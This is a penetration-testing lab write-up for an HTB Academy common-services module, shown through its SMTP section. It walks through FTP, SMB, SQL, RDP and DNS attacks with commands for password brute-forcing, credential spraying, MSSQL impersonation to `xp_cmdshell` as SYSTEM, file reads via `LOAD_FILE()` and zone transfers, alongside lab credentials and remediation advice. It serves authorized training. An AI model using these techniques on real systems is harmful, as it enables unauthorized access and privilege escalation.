**HTB Academy Module 116 · 19 Sections · NERO.SEC Lab Notes**  
**Prepared:** 05 November 2026 · **Scope:** Authorized HTB Academy targets only · **Language:** English  
**Module:** https://academy.hackthebox.com/app/module/116

> **Evidence integrity statement.** This is an independently authored technical report based on the supplied screenshots, the actual command/result history in the associated conversation, the official public module section list, and selected vendor security advisories. It is **not** a reproduction of the Academy's paywalled lessons. Commands labeled *Observed* were shown in screenshots or terminal transcripts; *Reproduction* commands are instructions to replay in an authorized lab and are not claimed as executed. If there is no supporting screenshot, the section is marked **Evidence Pending**. IP addresses were temporary HTB instances, not durable infrastructure. Passwords and flags below belong to deliberately vulnerable training systems; do not reuse them.

## Executive Summary

This engagement covered a progression of network services: FTP/FTPS, SMB, Microsoft SQL Server, MariaDB, RDP, DNS, SMTP and POP3. The main attack patterns were anonymous read access, excessive account permissions, credentials exposed in file shares, account enumeration through protocol response differences, password reuse, server-side file access, and SQL Server impersonation through a linked server. Three complete practical assessments were verified: **Easy** (SMTP → FTP → MariaDB `LOAD_FILE()`), **Medium** (DNS AXFR → anonymous FTP → password discovery → authenticated FTP), and **Hard** (anonymous SMB → Fiona's credentials → MSSQL impersonation → linked-server sysadmin → `xp_cmdshell` as SYSTEM).

| Assessment | Target observed | Decisive issue | End state |
|---|---|---|---|
| Easy | `10.129.203.7` / `WIN-EASY` | Credentials reused between FTP and MariaDB; MariaDB `FILE` access | Administrator Desktop flag read via `LOAD_FILE()` |
| Medium | `10.129.201.127` / Linux | Anonymous FTP leaks candidate passwords; second FTP trusts a weak candidate | `flag.txt` downloaded over FTP 2121 |
| Hard | `10.129.203.10` / `WIN-HARD` | Readable SMB credentials, inherited `IMPERSONATE`, privileged linked-server mapping | `xp_cmdshell` returned `nt authority\\system` and Administrator flag |

### Evidence conventions

- **ZIP / E01–E25:** original screenshots extracted from `Attacking Common Services.zip`, preserved without content edits. Every ZIP image is included and indexed in the Evidence Register.
- **Chat / C01–C03:** supplementary original conversation screenshots (DNS AXFR, RDP shell mismatch, Responder troubleshooting), separately labeled.
- **Observed:** established by an original screenshot or user-provided terminal output.
- **Reproduction / Example:** a command to understand or reproduce the method; no assertion that this command was executed during this attempt.
- **Evidence Pending:** an exercise, exploit, or intermediate result not independently supported by a screenshot supplied here.

---

## 01. Interacting with Common Services

**Objective.** Establish a disciplined way to connect to and interrogate file-sharing, mail, database, remote desktop and name-resolution services without mistaking protocol behavior for exploitation success.

### Service interaction model

The first task is identifying the correct **host, port, protocol, security mode, and identity**. A TCP connection to port 21 does not prove that another FTP listener on 2121 has the same authentication policy. An open port does not prove that a service accepts anonymous access. Likewise, a successful SQL connection can yield a login mapped to `guest` in the current database with extremely limited privileges. Record the exact transport and server banner before judging what the account can do.

| Family | Port(s) commonly seen | Native interaction | Questions to answer |
|---|---|---|---|
| File share | SMB 139/445; FTP 21/2121/30021 | `smbclient`, `ftp`, `lftp` | Can shares be listed? Are the files actually readable? |
| Mail | SMTP 25/587; POP3 110/995 | `nc -C`, `openssl s_client`, mail clients | Does recipient enumeration work? Is authentication permitted? |
| SQL | MSSQL 1433; MySQL 3306 | `impacket-mssqlclient`, `mysql` | Who am I? Which databases and server privileges exist? |
| Remote GUI | RDP 3389 | `xfreerdp` / `xfreerdp3` | Which user, domain and logon mode are in effect? |
| Name services | DNS TCP/UDP 53 | `dig`, `dnsrecon` | Is the DNS server authoritative? Which zones permit AXFR? |

### Reproduction-oriented baseline

```bash
TARGET=10.129.203.7
nmap -Pn -sT -p- --open -T4 "$TARGET" -oN tcp_ports.txt
nmap -Pn -sC -sV -p 21,25,80,443,587,3306,3389 "$TARGET" -oN services.txt
nc -nvz -w 5 "$TARGET" 3306
```

**Interpretation.** `-Pn` skips host discovery: the resulting `Host is up` line is not proof of a responsive remote OS. Similarly, a TCP `filtered` state and `OSError: [Errno 113] No route to host` are network-path problems rather than authentication failures. On Linux, shell quoting also matters: an exclamation mark in a double-quoted password may trigger Bash history expansion (`event not found`). Prefer single quotes around static credentials.

**Evidence.** The screenshots document actual enumeration and service identification in the assessment sections. No screenshot was provided for the introductory GUI demonstrations of each client — **Evidence Pending** for those examples.

**Defensive relevance.** Standardize inventory, authenticate only when needed, log access attempts, restrict services to required network zones, and treat banners as clues requiring verification rather than definitive vulnerability findings.

## 02. The Concept of Attacks

**Objective.** Analyze attacks using a reusable model that explains both trigger and impact rather than memorizing tool flags.

### Four-stage model

1. **Source:** The entry point or data under influence of an attacker: a username, share name, UNC path, DNS query, SMTP recipient, or SQL statement.
2. **Process:** The service and parsing logic that handle that input: SMB ACL evaluation, authentication, SQL query processing, DNS zone-transfer policy, or Windows networking.
3. **Privileges:** The account or security context performing the action: `ftp`, `guest`, `fiona`, a SQL Server service account, a linked-server mapped login, or `NT AUTHORITY\\SYSTEM`.
4. **Destination:** The security outcome: reading a file, capturing a challenge-response, establishing a session, modifying a server setting, or obtaining the contents of a protected flag.

### Mapping the model to a verified attack

The Hard assessment started from anonymous access to an SMB share. The **source** was human-readable files under `IT\\Fiona` and `IT\\John`. The **process** included SMB authorization, MSSQL Windows authentication, the SQL `EXECUTE AS` mechanism and linked-server mapping. The **privilege** changed from `WIN-HARD\\Fiona` (`IS_SRVROLEMEMBER('sysadmin') = 0`) to a linked-server login `testadmin` (`sysadmin = 1`), and OS commands ultimately executed as `nt authority\\system`. The **destination** was `C:\\Users\\Administrator\\Desktop\\flag.txt`.

```sql
-- Observed principal change in the Hard assessment
EXECUTE AS LOGIN = 'john';
EXECUTE('SELECT SYSTEM_USER AS login_name, IS_SRVROLEMEMBER(''sysadmin'') AS is_admin') AT [LOCAL.TEST.LINKED.SRV];
```

Expected observed result: `testadmin | 1`. A local login's `sysadmin = 0` is not inconsistent with a **different** login having administrative privileges on a linked server. That trust boundary was the key issue.

**Common analytical mistakes.** Finding a filename does not prove read permission; detecting a user does not prove a correct password; finding a SQL server role does not prove local Windows administration; `SHOW GRANTS` alone does not prove that the OS service can read every file. Distinguish a confirmed effect from a hypothesized next step.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


**Mitigation framing.** Remove unnecessary cross-service trust, use least-privilege service accounts, separate file and database access, restrict impersonation, and alert on unusual linked-server use and `xp_cmdshell` state changes.

## 03. Service Misconfigurations

**Objective.** Identify configurations that permit access beyond intended business needs, even in the absence of a software CVE.

### Tested misconfiguration classes

| Class | Observed example | Risk |
|---|---|---|
| Anonymous file access | Medium FTP 30021 exposed `/simon/mynotes.txt` | Offline discovery of candidate passwords |
| Excessive file share visibility | Hard SMB `Home` permitted access to `IT\\Simon`, `IT\\Fiona`, `IT\\John` | Credentials and internal notes disclosed |
| Credential reuse | Easy `fiona` credentials worked with FTP, HTTPS and MariaDB | Cross-service lateral access |
| Excessive SQL grants | Easy MariaDB `fiona@%` received `ALL PRIVILEGES ON *.*` and `secure_file_priv` was empty | Database-driven filesystem reads |
| DNS zone transfer exposed | Medium root zone AXFR returned 13 records; another DNS exercise exposed `hr` TXT | Infrastructure information and flags disclosed |
| Inherited impersonation | Hard `WINSRV02\\Database Readers` could impersonate `john` and `simon` | Privilege boundary crossed |
| Privileged linked server | `john` mapped to `testadmin` with SQL sysadmin | OS command execution potential |

### Enumeration and verification

```bash
# FTP: verify anonymous access per listener; do not assume port 21
nmap -Pn -p 2121,30021 --script ftp-anon 10.129.201.127

# SMB: enumerate shares, then independently test file read
smbclient -N -L //10.129.203.10

# DNS: query each permitted zone explicitly
dig @10.129.201.127 inlanefreight.htb AXFR
```

```sql
-- Database privilege inspection
SELECT USER(), CURRENT_USER();
SHOW GRANTS;
SHOW VARIABLES LIKE 'secure_file_priv';
```

**False positives and limits.** `smbclient ls` only demonstrates directory listing. FTP's initial `230` proves authentication but not necessarily access to every path. A blank `secure_file_priv` can remove an SQL-level path restriction, but the server process still needs filesystem permission. DNS `ANY` is not a reliable substitute for enumerating RR types or testing authorized AXFR.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


**Remediation.** Disable unnecessary anonymous access; segment administrative services; enforce share and file ACLs; limit database grants, especially `FILE`; require distinct strong credentials for unrelated systems; deny unintended zone transfers; review `IMPERSONATE` permissions and linked-server security mappings.

## 04. Finding Sensitive Information

**Objective.** Locate and validate information that materially advances an authorized assessment: passwords, private keys, configuration data, infrastructure names and files containing flags.

### Evidence-first search process

Start with available low-impact listings. Download only readable files that are within scope and preserve their original names and hashes. Search their contents **locally**, where possible, rather than issuing large numbers of remote read requests.

```bash
# Local inspection of downloaded lab text
file random.txt creds.txt information.txt secrets.txt 2>/dev/null
sha256sum random.txt creds.txt information.txt secrets.txt 2>/dev/null
grep -Ein 'password|credential|user|secret|linked|impersonat|token' *.txt
```

**Confirmed file locations:**

- Linux SMB `GGJ/id_rsa`: the filename appeared in a share listing, but the anonymous `get id_rsa` was denied in the actual conversation; a later screenshot showed a separate authenticated path. Never claim successful anonymous download from the mere listing.
- Medium internal FTP `/simon/mynotes.txt`: eight candidate strings; Hydra later confirmed one valid password for the separate FTP service on port 2121.
- Hard SMB `IT\\Simon\\random.txt`: five password-like strings, none of which authenticated Fiona over SMB in the observed test.
- Hard SMB `IT\\Fiona\\creds.txt`: contained five candidate credentials, of which `48Ns72!bns74@S84NNNSl` authenticated Fiona.
- Hard SMB `IT\\John\\information.txt`: noted database testing, a local linked server and simulated impersonation; this was a **directional hint**, not proof of a particular privilege.
- Easy FTP `docs.txt`, `WebServersInfo.txt`: exposed Core FTP HTTP Server versus Apache document roots and ports.

### Interpretation

Sensitive information is often disclosed by simple operational mistakes: a personal password note in an anonymous folder, a shared department directory accessible without authentication, or a web-server operations note that reveals service boundaries. The security failure is not the existence of a `.txt` file; it is an unintended principal being able to read it and then reuse the information.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


**Remediation.** Use secrets managers; segregate sensitive operational notes; apply strict read permissions; remove test credentials and backup artifacts; avoid passwords in globally readable directories; rotate any credential after confirmed exposure.

## 05. Attacking FTP

**Objective.** Enumerate FTP services, validate authentication, determine file privileges and assess whether the same credentials reach additional endpoints.

### Different FTP ports mean different attack surfaces

The Linux Medium target ran two ProFTPD listeners. The externally named `InlaneFTP` on **2121** denied anonymous authentication; `Internal FTP` on **30021** allowed it. The latter exposed `/simon/mynotes.txt`, which contained eight candidate passwords. Credential testing of those eight against **2121** revealed a valid `simon` login, and that session exposed `flag.txt`.

```bash
# Observed sequence, summarized for replay in the assigned lab
ftp 10.129.201.127 30021
# USER anonymous ; PASS <email>; cd simon ; get mynotes.txt ; bye

hydra -l simon -P mynotes.txt -s 2121 -t 2 -f ftp://10.129.201.127
ftp 10.129.201.127 2121
# USER simon ; PASS <discovered password>; ls ; get flag.txt ; bye
cat flag.txt
```

**Actual result:** Hydra returned a valid `simon` credential and authenticated FTP exposed a 29-byte `flag.txt`. The password was `8Ns8j1b!23hs4921smHzwn` in the session evidence. The Medium flag was `HTB{1qay2wsx3EDC4rfv_M3D1UM}`.

### FTP-over-HTTPS in the Easy assessment

The Windows Easy target ran Core FTP Server on port 21 and **Core FTP HTTP Server** on port 443, alongside Apache/XAMPP on port 80. The downloaded operations note named different server directories (`C:\\CoreFTP` vs `C:\\xampp\\htdocs`). The account `fiona:987654321` was validated through FTP and HTTPS Basic authentication:

```bash
curl -vk -H 'Host: localhost' --basic -u 'fiona:987654321' \
  https://10.129.203.7/docs.txt
```

The server responded `HTTP/1.1 200 OK` and `Server: Core FTP HTTP Server`. This proved read access through another protocol interface but did not prove arbitrary filesystem access or code execution.

### Useful commands and troubleshooting

```bash
nmap -sV -p 21,2121,30021 --script ftp-anon <LAB_TARGET>
ftp <LAB_TARGET> 2121
# ftp> passive        # toggle when data transfer fails
# ftp> ls
# ftp> pwd
# ftp> get <filename>
```

An FTP data-channel failure is distinct from a login failure. `229 Entering Extended Passive Mode` indicates EPSV setup; a `150` response starts a data connection; `226 Transfer complete` establishes successful transfer. `530 Login incorrect` means credentials were rejected.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


**Remediation.** Disable anonymous access unless indispensable, make FTP accounts read-only where possible, remove private notes, rate-limit authentication, enforce unique strong passwords and use SFTP or well-configured FTPS for sensitive data.

## 06. Latest FTP Vulnerabilities

**Objective.** Explain how to validate version-specific FTP vulnerabilities without confusing a banner with proof of exposure. The heading follows the module's official section name; examples are **historically documented CVEs**, not a claim that they are the newest disclosures in November 2026.

### Representative case: ProFTPD `mod_copy` (CVE-2015-3306)

Affected ProFTPD 1.3.5 deployments with the vulnerable `mod_copy` module could permit arbitrary file copy using the `SITE CPFR`/`SITE CPTO` command pair. NVD describes resulting arbitrary-file read/write consequences. An auditor should establish the exact version, whether the module is loaded, and whether the vulnerable configuration is reachable. A banner saying `ProFTPD` alone is insufficient.

### Representative misconfiguration: Core FTP HTTP serving

Core FTP in the Easy assessment offered the same logical content through FTP and HTTPS. The operator proved a Basic-authenticated download of `/docs.txt`. The screenshots **do not demonstrate** a successful traversal payload or a version-dependent exploit; such a claim would require request/response evidence tied to an advisory and affected build.

### Safe validation checklist

```bash
nmap -sV --script ftp-syst -p 21,2121,30021 <LAB_TARGET>
# Independently collect software version, module configuration and relevant patch evidence.
# Do not infer exploitability solely from a matching banner.
```

For known vulnerabilities, track CVE, affected version, prerequisite modules/configuration, pre-auth versus post-auth impact, vendor fixed version, and deployment-specific evidence. A pentest finding should capture **actual observable behavior**, such as unauthorized file disclosure, not merely a CVE string copied from a scanner.

**Evidence:**

> **[]** 
 (Core FTP service configuration), but **Evidence Pending** for any confirmed CVE exploitation in this module run.

**Remediation.** Patch/upgrade FTP daemons, disable unnecessary modules, confine server processes to dedicated storage, protect upload paths, and verify secure protocol configurations. Reference: [NVD CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306).

## 07. Attacking SMB

**Objective.** Enumerate shares, independently verify read permissions, retrieve exposed files and use access-control observations to drive credential testing.

### SMB share discovery

The introductory SMB exercise exposed `print$`, `GGJ` and `IPC$` on a Linux Samba host. Attempting to connect to a literal `SHARE_NAME` produced `NT_STATUS_BAD_NETWORK_NAME`, since it was a placeholder. Anonymous access to `print$` returned `NT_STATUS_ACCESS_DENIED`; `GGJ` permitted listing an `id_rsa` filename, but **anonymous `get` failed**. This distinction demonstrates why list/read ACLs must be checked separately.

```bash
smbclient -L //10.129.203.6 -N
smbclient //10.129.203.6/GGJ -N
# smb: \\> ls
# smb: \\> get id_rsa
```

The output also showed `IPC$`: it is a named-pipe/IPC share, not a regular directory for `ls -la` filesystem browsing. `smbclient` is not a Bash shell; its syntax differs from Linux `ls`.

### Hard assessment — authenticated discovery through an exposed share

The `Home` share on `10.129.203.10` exposed a tree of departments (`HR`, `IT`, `OPS`, `Projects`). Under `IT`, three users had folders: `Fiona`, `John`, `Simon`. File names retrieved during the actual session included:

```text
IT\\Simon\\random.txt
IT\\Fiona\\creds.txt
IT\\John\\information.txt
IT\\John\\notes.txt
IT\\John\\secrets.txt
```

```bash
smbclient //10.129.203.10/Home -N
# smb: \\> cd IT
# smb: \\IT\\> cd Simon
# smb: \\IT\\Simon\\> ls
# smb: \\IT\\Simon\\> get random.txt
```

`random.txt` was the verified answer to Hard Question 1. The `creds.txt` contents were materially more useful than guessing from `random.txt` because one password authenticated Fiona to SMB. The exact source of each candidate must be retained in the report to avoid a false causal chain.

### Credential validation

```bash
# In-scope lab credential testing using the extracted small list
nxc smb 10.129.203.10 -u Fiona -p fiona_pass.txt --local-auth
```

The actual output confirmed `WIN-HARD\\Fiona:48Ns72!bns74@S84NNNSl`. A positive result on one SMB service does not guarantee authorization on MSSQL or a remote shell; each access path was tested separately.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


**Remediation.** Disable guest reads of business documents and private keys, minimize share enumeration disclosure, enforce NTFS and share ACLs together, monitor access from unfamiliar hosts, and rotate exposed passwords.

## 08. Latest SMB Vulnerabilities

**Objective.** Separate protocol implementation flaws from access-control weaknesses that are common in enterprise shares.

### MS17-010 / CVE-2017-0144

Microsoft's MS17-010 bulletin addresses SMBv1 handling flaws that could permit remote code execution with specially crafted requests. Relevant verification requires knowing whether SMBv1 is enabled, the host build, patch level, and whether a scoped non-destructive check is approved. A port 445 banner **does not establish** MS17-010 vulnerability.

```bash
# Version and configuration reconnaissance, not proof of MS17-010 exploitability
nmap -Pn -p 445 --script smb-protocols,smb-security-mode <LAB_TARGET>
```

### Other SMB failure modes

- **Guest/anonymous share permissions:** as seen in the Hard assessment, allows retrieval of personal and departmental documents without an implementation bug.
- **SMB signing disabled:** may increase exposure to certain relay scenarios depending on the wider network and authentication configuration; absence of signing is not itself proof of a successful relay.
- **SMBv1 retained:** creates legacy attack surface and patching pressure; disable whenever operationally feasible.
- **Over-broad NTFS ACLs:** a share could permit listing without read or vice versa, as the `GGJ` file showed.

**Evidence.**

> **[]** 


> **[]** 
. No evidence of successful MS17-010/SMBGhost exploitation in the user-provided images — **Evidence Pending** for vulnerability exploitation.

**Remediation.** Keep security updates current, disable SMBv1, require signing where practical, block unnecessary inbound 445, review share + filesystem permissions, and use strong authentication. Reference: [Microsoft MS17-010 security bulletin](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010).

## 09. Attacking SQL Databases

**Objective.** Enumerate database identities and grants, test data/file-access boundaries, and recognize how impersonation and linked servers modify privilege calculations.

### MariaDB — Easy: excessive `FILE` permissions

After the operator found `fiona` via SMTP and authenticated FTP, the **same password** worked against MariaDB at `10.129.203.7:3306`. The first MySQL client attempt failed because TLS was required by the client but unsupported by the target. Adding `--skip-ssl` allowed login; this was a transport negotiation issue, not a password error.

```bash
mysql --skip-ssl -h 10.129.203.7 -P 3306 -u fiona -p
```

```sql
SELECT USER(), CURRENT_USER();
SHOW GRANTS;
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT LOAD_FILE('C:/xampp/htdocs/test.php');
SELECT LOAD_FILE('C:/Users/Administrator/Desktop/flag.txt');
```

**Actual evidence:** `CURRENT_USER()` returned `fiona@%`; `SHOW GRANTS` returned `ALL PRIVILEGES ON *.*`; `secure_file_priv` was blank; `LOAD_FILE('C:/xampp/htdocs/test.php')` returned the Hello World PHP source; the second `LOAD_FILE` returned the Administrator Desktop flag. The first file was a control proving readable filesystem access, helping distinguish an incorrect flag path from an inoperative SQL function.

### MSSQL — basic access is not administrator access

On a separate Windows SQL lab, `htbdbuser` was authenticated but mapped to `guest@master`, received `IS_SRVROLEMEMBER('sysadmin') = 0`, and could see `flagDB` in `sys.databases` while `HAS_DBACCESS('flagDB') = 0`. Listing a database does not grant the ability to query its tables. The lab also investigated NetNTLMv2 credential exposure through `xp_dirtree` and SMB challenge-response collection; the screenshot in the conversation shows an attempted Responder setup, **not proof of a successfully captured hash**.

```bash
impacket-mssqlclient 'htbdbuser:MSSQLAccess01!@10.129.184.82'
```

```sql
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
SELECT HAS_DBACCESS('flagDB');
```

### MSSQL — Hard: impersonation and linked server

The verified Hard chain used `WIN-HARD\\Fiona` to access `WIN-HARD\\SQLEXPRESS`. `enum_impersonate` established permissions inherited via `WINSRV02\\Database Readers` to impersonate `john` and `simon`. Neither principal was a local `sysadmin`. However, `EXECUTE AS LOGIN = 'john'` combined with execution on `LOCAL.TEST.LINKED.SRV` mapped to `testadmin` with `sysadmin = 1`.

```sql
EXECUTE AS LOGIN = 'john';
EXECUTE('SELECT SYSTEM_USER AS login_name, IS_SRVROLEMEMBER(''sysadmin'') AS is_admin') AT [LOCAL.TEST.LINKED.SRV];
```

With `xp_cmdshell` enabled on the linked server, `whoami` returned `nt authority\\system` and the query read the Administrator's flag. This is an **observed lab-only chain**, not evidence of the same condition in production.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


> **[]** 


**Remediation.** Do not give application users global grants; limit `FILE`, control `secure_file_priv`, apply OS permissions to DB service accounts, remove unnecessary SQL `IMPERSONATE`, restrict linked-server mappings and disable/monitor `xp_cmdshell`.

## 10. Latest SQL Vulnerabilities

**Objective.** Differentiate genuine database product vulnerabilities from insecure authentication, SQL-level delegation, and filesystem permissions.

### Example: SQL Server Reporting Services CVE-2020-0618

NVD documents an SSRS remote-code-execution issue in affected Microsoft SQL Server Reporting Services deployments. Successful risk evaluation requires knowing whether **SSRS** is installed and vulnerable — an instance of SQL Server alone is insufficient. Vendor patches and product/component inventory are prerequisites to any conclusion.

### Configuration issues found in this lab

The actual attacks did **not** require a verified unpatched SQL Server/MariaDB CVE. Instead, they used:

1. `fiona@%` with global privileges and the ability to read files through `LOAD_FILE()`.
2. MSSQL login impersonation granted to a Windows group.
3. A linked server with a stronger mapped principal (`testadmin`), where OS command execution operated as SYSTEM after configuration changed.

```sql
-- Safe privilege inventory examples
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, product, provider, data_source FROM sys.servers;
```

`xp_cmdshell` is an intentionally powerful administrative feature; its presence/enablement is a security configuration concern rather than a SQL engine CVE. Record who can change it and which Windows account executes its child process.

**Evidence.**

> **[]** 


> **[]** 


> **[]** 


> **[]** 
. CVE-2020-0618 exploitation is **Evidence Pending**, not claimed.

**Remediation.** Patch SQL components, remove unused SSRS installations, protect management ports, harden linked servers, audit principal mappings and database `FILE` privileges. Reference: [NVD CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618).

## 11. Attacking RDP

**Objective.** Validate RDP service access, understand Windows shell differences, and assess the role of Restricted Admin mode in pass-the-hash authentication in an explicitly authorized lab.

### Enumeration and legitimate RDP connection

A Windows training target exposed RDP at TCP 3389. An exercise provided `htb-rdp` with a password and requested the name of a file on the user Desktop, the Registry value associated with Restricted Admin mode, and Administrator Desktop evidence. The following is a **reproduction command**, not proof of an Administrator login:

```bash
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /cert:ignore /dynamic-resolution
# Use xfreerdp3 rather than xfreerdp on FreeRDP 3 installations.
```

Inside Windows, the operator opened **Command Prompt** and entered `Get-ChildItem`, a PowerShell cmdlet. CMD responded that the command was not recognized. This was a shell-context error, not a network or permission issue. Correct options are:

```cmd
REM Windows CMD
DIR "%USERPROFILE%\Desktop" /A
TYPE "%USERPROFILE%\Desktop\pentest-notes.txt"
```

```powershell
# Windows PowerShell
Get-ChildItem "$env:USERPROFILE\Desktop" -Force
Get-Content "$env:USERPROFILE\Desktop\pentest-notes.txt"
```

### Restricted Admin and pass-the-hash

The Windows Registry value **`DisableRestrictedAdmin`** is under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. Setting the DWORD to `0` allows Restricted Admin mode when the host and policy support it. In a permitted assessment, a Windows local administrator and the corresponding NTLM material can be used by compatible FreeRDP clients with `/pth`, subject to the target's configuration. These conditions are not interchangeable with ordinary password authentication.

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
REM Change requires administrative permission and an explicit lab need.
```

**Evidence classification.** The provided conversation image proves a successful user-level Windows session and the CMD/PowerShell mistake. A preceding walkthrough discussion supplied possible answers, but there is **no original screenshot in the ZIP showing the Administrator pass-the-hash logon or its resulting flag**. Do not mark this RDP exercise as fully evidenced.

**Evidence.**

> **[]** 
 — troubleshooting only. **Evidence Pending:** successful Administrator RDP/PtH flag retrieval.

**Remediation.** Restrict RDP at the firewall, mandate MFA through supported gateways, enforce least privilege, audit Remote Desktop logons, enable credential protection as appropriate, and use a documented policy for Restricted Admin mode instead of changing the setting without oversight.

## 12. Latest RDP Vulnerabilities

**Objective.** Understand RDP-related vulnerabilities and their prerequisites without assuming that every exposed 3389 listener is vulnerable.

### Representative vulnerability: BlueKeep / CVE-2019-0708

BlueKeep is a pre-authentication remote-code-execution flaw in **Remote Desktop Services on specific older Windows releases**; it is not a generic flaw in all RDP implementations. Microsoft released fixes in May 2019. The Windows build identified by an RDP NTLM info probe must be compared to a vendor advisory and patch state before drawing conclusions.

### Protocol and configuration weaknesses

- **Outdated RDS implementations:** require patch/version validation.
- **Exposed 3389:** a reachable service increases attack surface; it is not itself a CVE.
- **Weak or reused passwords:** can result in valid authenticated RDP access, separate from a protocol vulnerability.
- **Restricted Admin mode:** can affect credential handling and pass-the-hash exposure. The specific account type and server settings matter.
- **Unrestricted local Administrator RDP:** a management policy concern; apply administrative tiering and session monitoring.

```bash
# Information gathering only
nmap -Pn -sV -p 3389 --script rdp-ntlm-info 10.129.203.13
```

**Evidence.**

> **[]** 
 provides a real lab RDP shell screenshot, but no successful BlueKeep exploit or patch-state validation — **Evidence Pending** for any version-dependent vulnerability claim.

**Remediation.** Update all affected Windows hosts; restrict RDP to management networks or VPN; use NLA, MFA and administrative access controls; monitor RDS access. References: [Microsoft BlueKeep advisory](https://www.microsoft.com/en-us/msrc/blog/2019/05/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/), [CERT-EU 2019 advisory](https://cert.europa.eu/publications/security-advisories/2019-013/).

## 13. Attacking DNS

**Objective.** Retrieve authoritative DNS data, distinguish apex records from subzones, identify potentially exposed infrastructure, and verify whether AXFR is permitted.

### DNS exercise: root zone denied, child zone exposed

An authorized DNS task targeted `10.129.12.41` for `inlanefreight.htb`. Queries for SOA and NS succeeded and included the authoritative-answer (`aa`) flag. `ns.inlanefreight.htb` was advertised with A record `127.0.0.1`, which is the **loopback on the querying machine** if used as a destination, not a reachable alternate nameserver in the Pwnbox.

```bash
# Observed commands
dig @10.129.12.41 inlanefreight.htb SOA
dig @10.129.12.41 inlanefreight.htb NS
dig @10.129.12.41 inlanefreight.htb TXT
dig @10.129.12.41 inlanefreight.htb ANY
dig @10.129.12.41 inlanefreight.htb AXFR
```

The root-zone AXFR returned `Transfer failed`, TXT at the apex returned no answers, and ANY returned only SOA/NS. That **did not** establish that every subzone was protected. A DNSRecon brute-force identified `helpdesk.inlanefreight.htb` (`10.129.10.20`), and an independent query found `control.inlanefreight.htb` (`10.129.10.13`). Testing `hr.inlanefreight.htb` separately resulted in a successful AXFR with a TXT flag:

```bash
dig @10.129.12.41 hr.inlanefreight.htb AXFR
```

```text
hr.inlanefreight.htb.  604800  IN  TXT  "HTB{LUIHNFAS2871SJK1259991}"
XFR size: 5 records
```

**Key lesson:** AXFR permission is evaluated by zone. Denial for `inlanefreight.htb` does not prevent a separate delegated or locally served zone from allowing transfer. `ANY` also cannot be relied upon to inventory all records because server implementations commonly restrict responses.

### Medium assessment: root-zone AXFR was available

On the **different** target `10.129.201.127`, AXFR of `inlanefreight.htb` succeeded, returning 13 records with names including `app`, `dc1`, `dc2`, `int-ftp`, `int-nfs`, `ws1`, `ws2` and `wsus`. `int-ftp.inlanefreight.htb` resolved to `127.0.0.1` in that response. Hostnames revealed topology clues but did not by themselves prove those internal hosts were reachable from the Pwnbox.

```bash
dig @10.129.201.127 inlanefreight.htb AXFR
```

**Evidence.**

> **[]** 


> **[]** 


**Remediation.** Limit AXFR to explicitly approved secondary DNS servers using IP allowlists and TSIG where supported, audit every zone separately, monitor transfer attempts, and avoid disclosing internal naming schemes on externally reachable DNS infrastructure.

## 14. Latest DNS Vulnerabilities

**Objective.** Separate insecure DNS **configuration** from vulnerabilities in a DNS server **implementation**.

### Reference implementation flaw: SIGRed / CVE-2020-1350

CVE-2020-1350 is a critical Windows DNS Server remote-code-execution vulnerability related to parsing certain DNS SIG records. Its presence depends on vulnerable **Windows DNS Server** versions and missing security updates. The lab's visible nameserver identified itself as **ISC BIND 9.16.1**, so the reported SIGRed vulnerability **must not** be asserted against that BIND instance.

### Common DNS exposures relevant to this module

- **AXFR authorization errors:** the actual observed DNS disclosure involved zone transfer, not a memory corruption CVE.
- **Subdomain and hostname disclosure:** AXFR and dictionary queries can reveal internal naming, domain controllers, mail hosts and test infrastructure.
- **Misconfigured recursion:** a resolver available to everyone can enable abuse and unintended information gathering; the observed `recursion requested but not available` warning was not a vulnerability.
- **Cache poisoning and spoofing:** require a separate assessment of resolver policy, source-port/transaction-ID protections and DNSSEC deployment.

```bash
# Safe DNS configuration checks
dig @10.129.12.41 inlanefreight.htb SOA +norecurse
dig @10.129.12.41 inlanefreight.htb AXFR
dig @10.129.12.41 hr.inlanefreight.htb AXFR
```

**Evidence.**

> **[]** 


> **[]** 
 establish AXFR exposure in the designated lab targets. SIGRed exploitation is **Evidence Pending** / not indicated on the observed BIND server.

**Remediation.** Patch name servers, restrict recursion and AXFR, validate DNSSEC configuration if deployed, monitor anomalous zone transfers, and review both public and internal views. Reference: [NVD CVE-2020-1350](https://nvd.nist.gov/vuln/detail/CVE-2020-1350).

## 15. Attacking Email Services

**Objective.** Enumerate SMTP account behavior, differentiate message-sending from message-retrieval protocols, and use legitimately discovered credentials to inspect mailboxes in a sandbox.

### SMTP enumeration behavior

The Windows Easy assessment's hMailServer advertised SMTP on ports 25 and 587. It supported `AUTH LOGIN PLAIN`, but the operator observed that `VRFY` returned `502 VRFY disallowed` for both known-looking and random usernames. That alone does not show whether accounts exist.

Using `nc -C` was important because SMTP expects CRLF line endings. Following `EHLO`, the operator tested `RCPT TO` within a valid message envelope:

```text
EHLO inlanefreight.htb
MAIL FROM:<test@inlanefreight.htb>
RCPT TO:<administrator@inlanefreight.htb>
550 Account is not active.
RCPT TO:<randomuserxyz123@inlanefreight.htb>
550 Unknown user
```

The difference between disabled and nonexistent accounts provides an **account-enumeration side channel**, even though neither received a `250` success response. Enumerating with `smtp-user-enum -M RCPT` against a common names dictionary eventually yielded the address `fiona@inlanefreight.htb exists`. The original transcript showed the scanner could be slow; the operator stopped after finding the relevant user rather than exhaustively running all 10,713 names.

